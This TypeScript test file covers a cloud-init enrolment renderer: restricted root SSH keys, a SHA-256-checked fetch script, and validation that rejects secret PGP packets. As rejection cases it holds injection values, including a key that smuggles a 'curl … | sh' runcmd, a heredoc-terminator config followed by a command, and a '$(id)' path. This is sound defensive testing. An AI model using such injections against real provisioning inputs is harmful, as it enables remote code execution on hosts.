import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { describe, expect, it } from 'vitest';

import {
  assertEnrolment,
  assertPgpPublicKeyBlock,
  assertPullBootstrap,
  ENROLMENT_PACKAGES,
  PRODUCTION_LAYOUT,
  renderCloudInit,
  renderEnrolmentScript,
} from './cloudInit';
import type { Enrolment, EnrolmentLayout, PullBootstrap } from './cloudInit';
import {
  APPLY_KEY,
  bootstrap,
  CHECK_KEY,
  configText,
  EDGE_PLAYBOOK,
  enrolment,
  FILE_NAMES,
  PATHS,
  PGP_PUBLIC_KEY,
  REPOSITORY_RAW,
  SERVED,
  sha256,
  SSH_ED25519,
} from './enrolment.fixtures';

/**
 * Enrolment brings a new edge host under the gated pull at first boot. Everything
 * here is a control: the lines in root's `authorized_keys`, the script that fetches
 * three files and refuses each unless it matches its recorded SHA-256, the order of
 * its steps, and the checks on what stack config may put into a document that is
 * create-time-only and absent from every later diff.
 */

async function render(args: Parameters<typeof renderCloudInit>[0]): Promise<string> {
  return new Promise((resolve) => {
    renderCloudInit(args).apply(resolve);
  });
}

const enrolled = (privateOnly = false, over: Partial<Enrolment> = {}) =>
  render({ hostname: 'edge2', privateOnly, enrolment: enrolment(over) });

/** The content of one top-level cloud-config block, up to the next top-level key. */
function block(document: string, key: string): string {
  const startMatch = document.match(new RegExp(`\\n${key}:\\n?`));
  if (!startMatch || startMatch.index === undefined) {
    return '';
  }
  const rest = document.slice(startMatch.index + startMatch[0].length);
  const nextKey = rest.match(/\n[a-zA-Z_-]+:/);
  return nextKey && nextKey.index !== undefined ? rest.slice(0, nextKey.index) : rest;
}

/** The script of the runcmd `sh -c` entry, read back from the JSON string it was written as. */
function scriptOf(document: string): string {
  const entries = [
    ...block(document, 'runcmd').matchAll(/^ {2}- \[ sh, -c, ("(?:[^"\\]|\\.)*") \]$/gm),
  ];
  expect(entries).toHaveLength(1);
  return JSON.parse(entries[0]![1]!) as string;
}

describe('the root authorized_keys lines (C1, C6)', () => {
  it('restricts each key to one command of the pull program', async () => {
    const document = await enrolled();
    const lines = block(document, 'users').match(/- "restrict,command=.*"$/gm) ?? [];
    expect(lines.map((line) => JSON.parse(line.slice(2)) as string)).toEqual([
      `restrict,command="/usr/local/sbin/pull-trigger --mode apply" ${APPLY_KEY}`,
      `restrict,command="/usr/local/sbin/pull-trigger --mode check" ${CHECK_KEY}`,
    ]);
  });

  it('gives root the keys beside the default entry, never in place of it', async () => {
    const users = block(await enrolled(), 'users');
    expect(users.indexOf('  - default')).toBeGreaterThan(-1);
    expect(users.indexOf('  - default')).toBeLessThan(users.indexOf('  - name: root'));
    expect(users).toContain('ssh_authorized_keys:');
  });

  it('leaves root with lock_passwd false, so cloud-init does not lock the console login', async () => {
    const users = block(await enrolled(), 'users');
    const root = users.slice(users.indexOf('  - name: root'));
    expect(root).toMatch(/^ {4}lock_passwd: false$/m);
    expect(root.indexOf('lock_passwd: false')).toBeLessThan(root.indexOf('ssh_authorized_keys:'));
  });

  it('writes the keys through users, not write_files, so the datasource key survives', async () => {
    const files = block(await enrolled(), 'write_files');
    expect(files).not.toContain('authorized_keys');
    expect(files).not.toContain('/root/.ssh');
  });

  it('creates no deploy account, no sudoers rule and no deploy key', async () => {
    const document = await enrolled();
    expect(document).not.toContain('name: deploy');
    expect(document).not.toContain('50-branchleft-deploy');
    expect(document).not.toContain('NOPASSWD');
    expect(document).not.toContain('branchleft-deploy');
  });

  describe('the deploy key and the enrolment together (D8)', () => {
    it('is refused when both are set', () => {
      expect(() =>
        renderCloudInit({
          hostname: 'edge2',
          privateOnly: false,
          deployPublicKey: SSH_ED25519,
          enrolment: enrolment(),
        })
      ).toThrow(/no deploy account/);
    });

    it('renders the enrolment document with the enrolment alone', async () => {
      expect(await enrolled()).toContain('--mode apply');
    });

    it('renders the deploy-key document with the deploy key alone', async () => {
      const document = await render({
        hostname: 'edge2',
        privateOnly: false,
        deployPublicKey: SSH_ED25519,
      });
      expect(document).toContain('name: deploy');
      expect(document).not.toContain('--mode apply');
    });

    it('is refused with neither, as it was when the deploy key was required', () => {
      expect(() => renderCloudInit({ hostname: 'edge2', privateOnly: false })).toThrow(
        /required unless the host has an enrolment/
      );
    });
  });

  describe('the enrolment keys are checked like the deploy key (C5)', () => {
    const injections: Record<string, string> = {
      'a runcmd': `${SSH_ED25519} x\nruncmd:\n  - [ sh, -c, "curl http://example.invalid | sh" ]`,
      'a trailing newline': `${SSH_ED25519}\n`,
      'a carriage return': `${SSH_ED25519}\rruncmd: []`,
      'a private key': '-----BEGIN OPENSSH PRIVATE KEY-----',
    };
    for (const [name, key] of Object.entries(injections)) {
      it(`refuses ${name} as the apply key`, () => {
        expect(() => assertEnrolment(enrolment({ applyPublicKey: key }))).toThrow(
          /single-line OpenSSH public key/
        );
      });
      it(`refuses ${name} as the check key`, () => {
        expect(() => assertEnrolment(enrolment({ checkPublicKey: key }))).toThrow(
          /single-line OpenSSH public key/
        );
      });
    }

    it('refuses one key used for both, which would let the check key apply', () => {
      expect(() => assertEnrolment(enrolment({ checkPublicKey: APPLY_KEY }))).toThrow(
        /must be different keys/
      );
    });

    it('does not echo a rejected value', () => {
      try {
        assertEnrolment(
          enrolment({ applyPublicKey: '-----BEGIN OPENSSH PRIVATE KEY-----\nsecret-material' })
        );
        expect.unreachable('should have thrown');
      } catch (error) {
        expect((error as Error).message).not.toContain('secret-material');
      }
    });
  });
});

describe('what the document keeps from before (C8)', () => {
  it('keeps the SSH hardening drop-in', async () => {
    const files = block(await enrolled(), 'write_files');
    expect(files).toContain('/etc/ssh/sshd_config.d/01-branchleft-hardening.conf');
    expect(files).toContain('PermitRootLogin prohibit-password');
    expect(files).toContain('PasswordAuthentication no');
  });

  it('keeps the private-only route and resolver bootstrap, in bootcmd and not in runcmd', async () => {
    const document = await enrolled(true);
    expect(block(document, 'bootcmd')).toContain('ip route replace default via');
    expect(block(document, 'runcmd')).not.toContain('ip route replace');
  });

  it('adds no bootcmd for a host with a public interface', async () => {
    expect(await enrolled(false)).not.toContain('bootcmd:');
  });

  it('renders for a private-only host too: the fetch needs the gateway, and a failure leaves it un-enrolled', async () => {
    const document = await enrolled(true);
    expect(scriptOf(document)).toContain('fetch');
  });
});

describe('the packages (the 1C promise: never an unpinned engine)', () => {
  it('lists the base packages and the enrolment packages, and nothing else', async () => {
    const packages = block(await enrolled(), 'packages')
      .match(/^ {2}- (\S+)$/gm)!
      .map((line) => line.slice(4));
    expect(packages).toEqual(['ca-certificates', 'curl', 'gnupg', ...ENROLMENT_PACKAGES]);
  });

  it('never installs the engine, or a package manager that could resolve it', async () => {
    const packages = block(await enrolled(), 'packages');
    expect(packages).not.toMatch(/ansible|pipx|python3-pip|python3-setuptools|\bpip\b/);
  });

  it('has the packages the two roles install (the role lists are compared in the Python tests)', () => {
    expect([...ENROLMENT_PACKAGES].sort()).toEqual(
      ['git', 'gpg', 'gpgconf', 'openssh-client', 'python3', 'python3-venv'].sort()
    );
  });
});

describe('where the script sits in runcmd (M7)', () => {
  it('is one sh -c entry, the last, after the ssh reload', async () => {
    const runcmd = block(await enrolled(), 'runcmd');
    const entries = runcmd.split('\n').filter((line) => line.startsWith('  - ['));
    expect(entries.at(-1)).toMatch(/^ {2}- \[ sh, -c, "/);
    const reload = entries.findIndex((line) => line.includes('systemctl, reload, ssh'));
    const test = entries.findIndex((line) => line.includes('/usr/sbin/sshd, -t'));
    expect(test).toBeGreaterThan(-1);
    expect(reload).toBeGreaterThan(test);
    expect(entries.length - 1).toBeGreaterThan(reload);
    expect(entries.filter((line) => line.includes('sh, -c'))).toHaveLength(1);
  });

  it('starts with set -eu, so its first failure is its last command', async () => {
    expect(scriptOf(await enrolled()).startsWith('set -eu\n')).toBe(true);
  });

  it('is a valid shell script, parsed from a file and never run', async () => {
    // -n with -c does not stop dash from running the command, so the script goes in a file.
    const file = join(mkdtempSync(join(tmpdir(), 'enrol-parse')), 'script.sh');
    writeFileSync(file, scriptOf(await enrolled()));
    const check = spawnSync(shell(), ['-n', file], { encoding: 'utf8' });
    expect(check.status, check.stderr).toBe(0);
  });

  it('keeps the whole document well inside the 32 KiB user-data limit', async () => {
    expect((await enrolled(true)).length).toBeLessThan(16 * 1024);
  });

  it('is YAML-safe: the script is written as a JSON string, so nothing in it can end its entry', async () => {
    const document = await enrolled();
    const entry = block(document, 'runcmd')
      .split('\n')
      .find((line) => line.includes('sh, -c, "'))!;
    expect(entry.includes('\n')).toBe(false);
    expect(entry.endsWith('" ]')).toBe(true);
  });
});

describe('no private key material reaches the document (C5)', () => {
  it('carries exactly one public armour header and footer, and no other armour line', async () => {
    const document = await enrolled();
    expect(document.match(/-----BEGIN [A-Z ]+-----/g)).toEqual([
      '-----BEGIN PGP PUBLIC KEY BLOCK-----',
    ]);
    expect(document.match(/-----END [A-Z ]+-----/g)).toEqual([
      '-----END PGP PUBLIC KEY BLOCK-----',
    ]);
  });

  describe('the signer block allowlist', () => {
    const body = 'mQINBGWmxXYBEACyN+4viFQM6QQoKr0A2W0rGdMobTJwOZso2QPpewbyBsuL3rNW';
    const wrap = (data: string, header = 'PUBLIC', footer = 'PUBLIC') =>
      `-----BEGIN PGP ${header} KEY BLOCK-----\n\n${data}\n-----END PGP ${footer} KEY BLOCK-----\n`;
    // OpenPGP packet types (RFC 4880, section 4.3) and the packets that carry them.
    const SIGNATURE = 2;
    const SECRET_KEY = 5;
    const PUBLIC_KEY = 6;
    const SECRET_SUBKEY = 7;
    const USER_ID = 13;
    const PUBLIC_SUBKEY = 14;
    const USER_ATTRIBUTE = 17;
    const filler = (size: number) => Buffer.alloc(size, 0x41);
    const newPacket = (tag: number, data: Buffer): Buffer => {
      const size = data.length;
      let length: number[];
      if (size < 192) {
        length = [size];
      } else if (size < 8384) {
        length = [((size - 192) >> 8) + 192, (size - 192) & 0xff];
      } else {
        length = [
          255,
          (size >>> 24) & 0xff,
          (size >>> 16) & 0xff,
          (size >>> 8) & 0xff,
          size & 0xff,
        ];
      }
      return Buffer.concat([Buffer.from([0xc0 | tag, ...length]), data]);
    };
    const oldPacket = (tag: number, data: Buffer, lengthType: 0 | 1 | 2): Buffer => {
      const width = 1 << lengthType;
      const length = Buffer.alloc(width);
      length.writeUIntBE(data.length, 0, width);
      return Buffer.concat([Buffer.from([0x80 | (tag << 2) | lengthType]), length, data]);
    };
    const armoured = (...packets: Buffer[]): string => {
      const lines =
        Buffer.concat(packets)
          .toString('base64')
          .match(/.{1,64}/g) ?? [];
      return wrap(`${lines.join('\n')}\n=AAAA`);
    };
    const rejected: Record<string, string> = {
      'a private header': wrap(body, 'PRIVATE', 'PRIVATE'),
      'a private header under a public footer': wrap(body, 'PRIVATE', 'PUBLIC'),
      'a secret-key packet under a public header (new format)': wrap('xQECAw=='),
      'a secret-key packet under a public header (old format)': wrap('lQECAw=='),
      'a second armour line': `${wrap(body)}-----BEGIN PGP PRIVATE KEY BLOCK-----\n`,
      'an embedded armour line': wrap(`${body}\n-----BEGIN PGP PRIVATE KEY BLOCK-----`),
      'text before the header': `hello\n${wrap(body)}`,
      'no blank line before the data': wrap(body).replace('\n\n', '\n'),
      'non-base64 data': wrap('not base64 !!'),
      'no data': wrap(''),
      'data that is not a packet': wrap('AAAA'),
      'a first packet that is a user id (tag 13)': wrap('zQECAw=='),
    };
    for (const [name, block] of Object.entries(rejected)) {
      it(`refuses ${name}`, () => {
        expect(() => assertPgpPublicKeyBlock(block)).toThrow();
      });
    }

    it('accepts a public key block (new-format and old-format public key packets)', () => {
      expect(assertPgpPublicKeyBlock(PGP_PUBLIC_KEY)).toBe(PGP_PUBLIC_KEY);
      for (const lengthType of [0, 1, 2] as const) {
        expect(() =>
          assertPgpPublicKeyBlock(armoured(oldPacket(PUBLIC_KEY, filler(40), lengthType)))
        ).not.toThrow();
      }
      expect(() =>
        assertPgpPublicKeyBlock(armoured(newPacket(PUBLIC_KEY, filler(40))))
      ).not.toThrow();
    });

    it('accepts every packet a public key block is made of, however long each is', () => {
      for (const size of [0, 100, 191, 192, 300, 8383, 8384, 70_000]) {
        const block = armoured(
          newPacket(PUBLIC_KEY, filler(size)),
          newPacket(USER_ID, filler(20)),
          newPacket(SIGNATURE, filler(size)),
          newPacket(PUBLIC_SUBKEY, filler(size)),
          newPacket(SIGNATURE, filler(size)),
          newPacket(USER_ATTRIBUTE, filler(size)),
          oldPacket(SIGNATURE, filler(size % 250), 0)
        );
        expect(() => assertPgpPublicKeyBlock(block), `size ${size}`).not.toThrow();
      }
    });

    it('accepts the signer key that production holds, which is a whole key', () => {
      expect(() => assertPgpPublicKeyBlock(PGP_PUBLIC_KEY)).not.toThrow();
      expect(PGP_PUBLIC_KEY.split('\n').length).toBeGreaterThan(25);
    });

    // Every packet is read, not only the first: a public primary key does not make what
    // follows it public. These are the blocks that carry secret material under a public header.
    const mixed: Record<string, string> = {
      'a secret subkey after the public key (tag 7)': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        newPacket(SECRET_SUBKEY, filler(40))
      ),
      'a secret key after the public key (tag 5)': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        newPacket(SECRET_KEY, filler(40))
      ),
      'a secret subkey after a user id and a signature': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        newPacket(USER_ID, filler(20)),
        newPacket(SIGNATURE, filler(60)),
        newPacket(SECRET_SUBKEY, filler(40))
      ),
      'a secret subkey in the old format': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        oldPacket(SECRET_SUBKEY, filler(40), 0)
      ),
      'a secret subkey behind a packet with a long length': armoured(
        newPacket(PUBLIC_KEY, filler(9000)),
        newPacket(SIGNATURE, filler(300)),
        oldPacket(SECRET_SUBKEY, filler(40), 1)
      ),
      'a secret subkey behind an old-format four-octet length': armoured(
        oldPacket(PUBLIC_KEY, filler(70_000), 2),
        newPacket(SECRET_SUBKEY, filler(40))
      ),
      'a packet type that is not part of a key (a literal-data packet, tag 11)': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        newPacket(11, filler(40))
      ),
      'a trust packet (tag 12)': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        newPacket(12, filler(2))
      ),
      'a packet whose length runs past the data': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        Buffer.concat([Buffer.from([0xc0 | SIGNATURE, 100]), filler(10)])
      ),
      'bytes after the last packet that are not a packet': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        Buffer.from([0x00, 0x01])
      ),
      'a header with no length': armoured(newPacket(PUBLIC_KEY, filler(40)), Buffer.from([0xc2])),
      'a partial length': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        Buffer.concat([Buffer.from([0xc0 | SIGNATURE, 224]), filler(1 << 0)])
      ),
      'an indeterminate length': armoured(
        newPacket(PUBLIC_KEY, filler(40)),
        Buffer.concat([Buffer.from([0x80 | (SIGNATURE << 2) | 3]), filler(10)])
      ),
    };
    for (const [name, block] of Object.entries(mixed)) {
      it(`refuses ${name}`, () => {
        expect(() => assertPgpPublicKeyBlock(block)).toThrow(/signer key|OpenPGP|packet/i);
      });
    }

    it('refuses a secret subkey inside a bootstrap config, wherever it is in the key', () => {
      const key = mixed['a secret subkey after a user id and a signature']!;
      expect(() =>
        assertPullBootstrap(
          bootstrap({ config: configText({ signers: [{ format: 'openpgp', key }] }) })
        )
      ).toThrow(/not part of a public key/);
    });
  });

  it('refuses a bootstrap whose signer is a secret key', () => {
    const secret = PGP_PUBLIC_KEY.replace('mQINBGWmxXYBEACy', 'lQINBGWmxXYBEACy');
    expect(() =>
      assertPullBootstrap(
        bootstrap({ config: configText({ signers: [{ format: 'openpgp', key: secret }] }) })
      )
    ).toThrow(/public key/);
  });
});

describe('the bootstrap record is checked before anything is rendered (C9)', () => {
  const entry = (name: keyof typeof PATHS, pin = '1'.repeat(40)) => ({
    pin,
    sha256: sha256(SERVED[name]),
    url: `${REPOSITORY_RAW}/${pin}/${PATHS[name]}`,
  });
  const cases: Record<string, [Record<string, unknown>, RegExp]> = {
    'a config with no playbook key': [
      { config: configText({ playbook: undefined }) },
      /no playbook/,
    ],
    'a playbook that is not edge1': [
      {
        config: configText({
          playbook: 'ansible/playbooks/db1.yml',
          playbooks: ['ansible/playbooks/db1.yml'],
        }),
      },
      new RegExp(`playbook must be ${EDGE_PLAYBOOK.replace(/[.]/g, '\\.')}`),
    ],
    'a playbook allowlist with another playbook beside edge1': [
      {
        config: configText({
          playbooks: [EDGE_PLAYBOOK, 'ansible/playbooks/db1.yml'],
        }),
      },
      /playbooks must be exactly/,
    ],
    'an empty signer list': [{ config: configText({ signers: [] }) }, /at least one signer/],
    'an ssh signer': [
      { config: configText({ signers: [{ format: 'ssh', key: SSH_ED25519 }] }) },
      /OpenPGP/,
    ],
    'a signer with an extra field': [
      { config: configText({ signers: [{ format: 'openpgp', key: PGP_PUBLIC_KEY, extra: 1 }] }) },
      /exactly the keys/,
    ],
    'a config that is not JSON': [{ config: 'not json\n' }, /must be JSON/],
    'a config that is not an object': [{ config: '[1]\n' }, /JSON object/],
    'a config with no trailing newline': [{ config: configText().trimEnd() }, /end with a newline/],
    'a config with a non-ASCII character': [
      { config: configText({ extra: 'café' }) },
      /printable ASCII/,
    ],
    'a config holding the heredoc terminator on a line of its own': [
      { config: '{}\nBRANCHLEFT_CONFIG_EOF\ntouch /tmp/not-this\n' },
      /heredoc/,
    ],
    'another remote': [
      { config: configText({ remote_url: 'https://example.invalid/x.git' }) },
      /remote_url/,
    ],
    'another ansible-playbook path': [
      { config: configText({ ansible_playbook: '/tmp/x' }) },
      /ansible_playbook/,
    ],
    'a negative timeout': [{ config: configText({ timeout_seconds: -1 }) }, /positive integer/],
    'schema 2': [{ schema: 2 }, /schema 1/],
    'an extra field': [{ extra: 'x' }, /exactly the keys/],
    'a missing file': [{ lock: undefined }, /exactly the keys|must be an object/],
    'a url that names another pin than the one recorded': [
      { lock: { ...entry('lock'), url: `${REPOSITORY_RAW}/${'9'.repeat(40)}/${PATHS.lock}` } },
      /url must name its own pin/,
    ],
    'a url for another file': [
      {
        program: {
          ...entry('program'),
          url: `${REPOSITORY_RAW}/${'1'.repeat(40)}/${PATHS.wrapper}`,
        },
      },
      /url must name its own pin/,
    ],
    'a url on another host': [
      {
        wrapper: {
          ...entry('wrapper'),
          url: `https://example.invalid/${'1'.repeat(40)}/${PATHS.wrapper}`,
        },
      },
      /url must name its own pin/,
    ],
    'a pin that is not a full commit id': [
      {
        wrapper: {
          ...entry('wrapper'),
          pin: 'main',
          url: `${REPOSITORY_RAW}/main/${PATHS.wrapper}`,
        },
      },
      /full commit id/,
    ],
    'an uppercase sha256': [
      { lock: { ...entry('lock'), sha256: 'A'.repeat(64) } },
      /64 lowercase hex/,
    ],
  };
  for (const [name, [override, message]] of Object.entries(cases)) {
    it(`refuses ${name}, before anything is created`, () => {
      const record = { ...bootstrap(), ...override };
      for (const [key, value] of Object.entries(record)) {
        if (value === undefined) {
          delete (record as Record<string, unknown>)[key];
        }
      }
      expect(() => assertPullBootstrap(record)).toThrow(message);
      expect(() =>
        renderCloudInit({
          hostname: 'edge2',
          privateOnly: false,
          enrolment: {
            applyPublicKey: APPLY_KEY,
            checkPublicKey: CHECK_KEY,
            bootstrap: record as PullBootstrap,
          },
        })
      ).toThrow(message);
    });
  }

  it('accepts the record the tests build, so the refusals above are not for another reason', () => {
    expect(() => assertPullBootstrap(bootstrap())).not.toThrow();
  });
});

// ---------------------------------------------------------------------------
// The script, run for real under dash with a curl that serves local files.
// ---------------------------------------------------------------------------

function shell(): string {
  return existsSync('/bin/dash') ? '/bin/dash' : '/bin/sh';
}

interface Run {
  status: number | null;
  stderr: string;
  dir: string;
  layout: EnrolmentLayout;
  requested: string[];
  stubArguments: string | undefined;
  failure: string | undefined;
}

const CURL_SHIM = `#!/bin/sh
prev=""
out=""
url=""
for a in "$@"; do
  if [ "$prev" = "--output" ]; then out="$a"; fi
  prev="$a"
  url="$a"
done
name=$(basename "$url")
echo "$url" >> "$SERVE_DIR/requests.log"
[ -f "$SERVE_DIR/$name" ] || exit 22
cp "$SERVE_DIR/$name" "$out"
`;

const SHA256SUM_SHIM = `#!/bin/sh
exec shasum -a 256 -c -
`;

const PYTHON_STUB = `#!/bin/sh
echo "$@" > "$STUB_LOG"
if [ -n "\${STUB_FAIL:-}" ]; then
  echo "stub: the install failed" >&2
  exit 1
fi
link=""
while [ $# -gt 0 ]; do
  if [ "$1" = "--link" ]; then link="$2"; fi
  shift
done
ln -s /nowhere/ansible-playbook "$link"
`;

function runScript(
  served: Partial<Record<keyof typeof FILE_NAMES, string>> = {},
  options: {
    stubFails?: boolean;
    bootstrapOverride?: Partial<PullBootstrap>;
    /** Puts a plain file where the script needs a directory, so that step fails. */
    obstruct?: 'config' | 'wrapper';
  } = {}
): Run {
  const dir = mkdtempSync(join(tmpdir(), 'enrol'));
  const bin = join(dir, 'bin');
  const serve = join(dir, 'serve');
  mkdirSync(bin);
  mkdirSync(serve);
  const write = (path: string, text: string) => {
    writeFileSync(path, text);
    chmodSync(path, 0o755);
  };
  write(join(bin, 'curl'), CURL_SHIM);
  write(join(bin, 'python-stub'), PYTHON_STUB);
  if (spawnSync('sh', ['-c', 'command -v sha256sum']).status !== 0) {
    write(join(bin, 'sha256sum'), SHA256SUM_SHIM);
  }
  for (const name of Object.keys(FILE_NAMES) as (keyof typeof FILE_NAMES)[]) {
    writeFileSync(join(serve, FILE_NAMES[name]), served[name] ?? SERVED[name]);
  }
  const layout: EnrolmentLayout = {
    markerDir: join(dir, 'state'),
    workDir: join(dir, 'state', 'work'),
    failureMarker: join(dir, 'state', 'enrol.failed'),
    doneMarker: join(dir, 'state', 'enrol.done'),
    wrapperPath: join(dir, 'sbin', 'pull-trigger'),
    configDir: join(dir, 'etc'),
    configPath: join(dir, 'etc', 'config.json'),
    stateDir: join(dir, 'var-lib'),
    logDir: join(dir, 'var-log'),
    runtimeRoot: join(dir, 'runtime'),
    runtimeLink: join(dir, 'bin', 'ansible-playbook'),
    python: join(bin, 'python-stub'),
    ownerFlags: '',
  };
  if (options.obstruct === 'wrapper') {
    writeFileSync(join(dir, 'sbin'), 'not a directory');
  } else {
    mkdirSync(join(dir, 'sbin'));
  }
  if (options.obstruct === 'config') {
    writeFileSync(layout.configDir, 'not a directory');
  }
  const record = { ...bootstrap(), ...options.bootstrapOverride };
  const script = renderEnrolmentScript(record, layout);
  const done = spawnSync(shell(), ['-c', script], {
    encoding: 'utf8',
    env: {
      PATH: `${bin}:/usr/bin:/bin:/usr/sbin:/sbin`,
      SERVE_DIR: serve,
      STUB_LOG: join(dir, 'stub.log'),
      ...(options.stubFails ? { STUB_FAIL: '1' } : {}),
    },
  });
  const read = (path: string): string | undefined =>
    existsSync(path) ? readFileSync(path, 'utf8') : undefined;
  return {
    status: done.status,
    stderr: done.stderr,
    dir,
    layout,
    requested: (read(join(serve, 'requests.log')) ?? '').split('\n').filter(Boolean),
    stubArguments: read(join(dir, 'stub.log')),
    failure: read(layout.failureMarker),
  };
}

/** True for a link that exists, whether or not it points anywhere. */
function linkExists(path: string): boolean {
  try {
    lstatSync(path);
    return true;
  } catch {
    return false;
  }
}

function nothingInstalled(run: Run): void {
  expect(existsSync(run.layout.wrapperPath)).toBe(false);
  expect(existsSync(run.layout.configPath)).toBe(false);
  expect(existsSync(run.layout.doneMarker)).toBe(false);
  expect(linkExists(run.layout.runtimeLink)).toBe(false);
}

describe('the script that enrols the host (C2, C13)', () => {
  it('installs when every hash matches: the positive control for the refusals below', () => {
    const run = runScript();
    expect(run.status, run.stderr).toBe(0);
    expect(run.failure).toBeUndefined();
    expect(readFileSync(run.layout.wrapperPath, 'utf8')).toBe(SERVED.wrapper);
    expect(readFileSync(run.layout.configPath, 'utf8')).toBe(bootstrap().config);
    expect(existsSync(run.layout.doneMarker)).toBe(true);
    expect(linkExists(run.layout.runtimeLink)).toBe(true);
    expect(run.stubArguments).toContain(`--lock-sha256 ${sha256(SERVED.lock)}`);
    expect(run.stubArguments).toContain('--link');
  });

  it('fetches exactly the three recorded addresses, and no other', () => {
    const run = runScript();
    expect(run.requested).toEqual([
      bootstrap().wrapper.url,
      bootstrap().program.url,
      bootstrap().lock.url,
    ]);
  });

  describe.each(Object.keys(FILE_NAMES) as (keyof typeof FILE_NAMES)[])(
    'a wrong hash on the %s',
    (name) => {
      for (const wrong of ['not what was recorded\n', 'something else again\n']) {
        it(`stops at its check and installs nothing (served ${JSON.stringify(wrong.trim())})`, () => {
          const run = runScript({ [name]: wrong });
          expect(run.status).not.toBe(0);
          expect(run.failure).toBe(`failed at check-${name}\n`);
          expect(run.stubArguments, 'the install program must not run').toBeUndefined();
          nothingInstalled(run);
          expect(existsSync(run.layout.runtimeLink)).toBe(false);
        });
      }
    }
  );

  it('stops at the fetch when a file cannot be fetched', () => {
    const missing = runScriptWithoutServing();
    expect(missing.status).not.toBe(0);
    expect(missing.failure).toBe('failed at fetch-wrapper\n');
    nothingInstalled(missing);
  });

  it('a failing install leaves no link, no pull program and no config, and records the step', () => {
    const run = runScript({}, { stubFails: true });
    expect(run.status).not.toBe(0);
    expect(run.failure).toBe('failed at install-engine\n');
    expect(existsSync(run.layout.runtimeLink)).toBe(false);
    nothingInstalled(run);
  });

  describe('a failure after the engine is installed never leaves the pull program', () => {
    it('stops at write-config, with the pinned engine linked and no pull program, config or done marker', () => {
      const run = runScript({}, { obstruct: 'config' });
      expect(run.status).not.toBe(0);
      expect(run.failure).toBe('failed at write-config\n');
      expect(linkExists(run.layout.runtimeLink), 'the engine installed before it').toBe(true);
      expect(existsSync(run.layout.wrapperPath)).toBe(false);
      expect(existsSync(run.layout.configPath)).toBe(false);
      expect(existsSync(run.layout.doneMarker)).toBe(false);
    });

    it('stops at install-trigger, with the config in place and no pull program or done marker', () => {
      const run = runScript({}, { obstruct: 'wrapper' });
      expect(run.status).not.toBe(0);
      expect(run.failure).toBe('failed at install-trigger\n');
      expect(readFileSync(run.layout.configPath, 'utf8')).toBe(bootstrap().config);
      expect(existsSync(run.layout.wrapperPath)).toBe(false);
      expect(existsSync(run.layout.doneMarker)).toBe(false);
    });

    it('places the pull program as the last command before the done marker', () => {
      const lines = renderEnrolmentScript(bootstrap(), PRODUCTION_LAYOUT).split('\n');
      const placed = lines.findIndex((line) => line.includes(PRODUCTION_LAYOUT.wrapperPath));
      const config = lines.findIndex((line) => line.includes(PRODUCTION_LAYOUT.configPath));
      expect(placed).toBeGreaterThan(config);
      expect(lines[placed - 1]).toBe('step=install-trigger');
      expect(lines[placed + 1]).toBe('step=done');
      expect(lines.filter((line) => line.includes(PRODUCTION_LAYOUT.wrapperPath))).toHaveLength(1);
    });
  });

  it('removes the marker of an earlier failure when it runs again and succeeds', () => {
    const first = runScript({}, { stubFails: true });
    expect(first.failure).toBeDefined();
    const second = runScript();
    expect(second.failure).toBeUndefined();
  });

  it('does not give the install program anything but the lock, its hash, the root and the link', () => {
    const run = runScript();
    const words = run.stubArguments!.trim().split(' ');
    expect(words.filter((word) => word.startsWith('--')).sort()).toEqual([
      '--link',
      '--lock',
      '--lock-sha256',
      '--root',
    ]);
  });
});

function runScriptWithoutServing(): Run {
  const dir = mkdtempSync(join(tmpdir(), 'enrol'));
  const bin = join(dir, 'bin');
  const serve = join(dir, 'serve');
  mkdirSync(bin);
  mkdirSync(serve);
  writeFileSync(join(bin, 'curl'), CURL_SHIM);
  chmodSync(join(bin, 'curl'), 0o755);
  const layout: EnrolmentLayout = {
    ...PRODUCTION_LAYOUT,
    markerDir: join(dir, 'state'),
    workDir: join(dir, 'state', 'work'),
    failureMarker: join(dir, 'state', 'enrol.failed'),
    doneMarker: join(dir, 'state', 'enrol.done'),
    wrapperPath: join(dir, 'sbin', 'pull-trigger'),
    configDir: join(dir, 'etc'),
    configPath: join(dir, 'etc', 'config.json'),
    stateDir: join(dir, 'var-lib'),
    logDir: join(dir, 'var-log'),
    runtimeRoot: join(dir, 'runtime'),
    runtimeLink: join(dir, 'bin', 'ansible-playbook'),
    python: join(bin, 'python-stub'),
    ownerFlags: '',
  };
  const done = spawnSync(shell(), ['-c', renderEnrolmentScript(bootstrap(), layout)], {
    encoding: 'utf8',
    env: { PATH: `${bin}:/usr/bin:/bin`, SERVE_DIR: serve },
  });
  return {
    status: done.status,
    stderr: done.stderr,
    dir,
    layout,
    requested: [],
    stubArguments: undefined,
    failure: existsSync(layout.failureMarker)
      ? readFileSync(layout.failureMarker, 'utf8')
      : undefined,
  };
}

describe('the script refuses a layout that is not plain paths', () => {
  it('refuses a path with a quote or a space', () => {
    for (const bad of ["/tmp/a'b", '/tmp/a b', '/tmp/$(id)']) {
      expect(() =>
        renderEnrolmentScript(bootstrap(), { ...PRODUCTION_LAYOUT, workDir: bad })
      ).toThrow(/plain path/);
    }
  });
});
